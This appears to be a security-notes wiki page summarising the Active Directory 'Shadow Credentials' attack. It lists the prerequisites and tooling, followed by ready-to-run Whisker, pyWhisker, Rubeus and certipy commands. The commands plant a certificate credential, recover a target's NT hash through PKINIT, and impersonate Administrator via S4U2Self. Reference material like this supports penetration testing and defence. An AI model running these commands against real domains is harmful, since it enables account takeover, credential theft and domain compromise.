---
title: Shadow Credentials
type: source
created: 2026-06-13
updated: 2026-06-13
tags: [active-directory, kerberos, privilege-escalation, persistence]
source: raw/shadow_credentials.md
---

# Shadow Credentials

> Source: `raw/shadow_credentials.md` (ired.team)

## Summary

Account takeover via writing to the `msDS-KeyCredentialLink` attribute on
a target user/computer object — injecting an attacker-controlled
certificate as an alternate credential. The attacker then authenticates as
the target via [[pkinit-unpac-the-hash|PKINIT]] and can recover the
account's NT hash directly, no password reset and no cracking needed. See
[[shadow-credentials]] (concept) for the mechanism and [[acl-abuse]] for
the write-permission prerequisite.

## Key points

- **Prerequisite**: write access to `msDS-KeyCredentialLink` on the target
  (GenericWrite/GenericAll/explicit attribute write — a BloodHound
  `AddKeyCredentialLink` edge), AD CS configured, DC running Server 2016+.
- **Tools**: Whisker (Windows), pyWhisker (cross-platform) to add the
  credential; Rubeus `asktgt /getcredentials` to request a TGT and recover
  the NT hash via PKINIT.
- **Escalation path**: for computer accounts, follow up with Rubeus `s4u`
  (S4U2Self) to impersonate a privileged user against the compromised
  computer's services — see [[kerberos-delegation-abuse]].
- **Origin**: publicly documented by Elad Shamir (2021); now a standard
  technique in BloodHound-driven attack paths.

## Commands

```powershell
# Whisker — add a shadow credential to a target (outputs a ready Rubeus command)
Whisker.exe add /target:victimuser

# Whisker — remove the planted credential afterwards (cleanup)
Whisker.exe remove /target:victimuser /deviceid:<DeviceID from add output>

# Rubeus — request a TGT via PKINIT using the planted cert, recover NT hash
Rubeus.exe asktgt /user:victimuser /certificate:<base64 PFX> /password:"<PFX export password>" /domain:corp.local /dc:dc01.corp.local /getcredentials /show /ptt
```

```bash
# pyWhisker — cross-platform equivalent
python3 pywhisker.py -d corp.local -u attacker -p 'Passw0rd!' --target victimuser --action add

# Then request TGT + NT hash with certipy
certipy auth -pfx victimuser.pfx -domain corp.local -dc-ip <dc-ip>
```

```powershell
# Computer account takeover -> impersonate Domain Admin via S4U2Self
Rubeus.exe s4u /ticket:<base64 TGT> /impersonateuser:Administrator /self /service:host/victim-pc.corp.local /altservice:cifs/victim-pc.corp.local /ptt
```
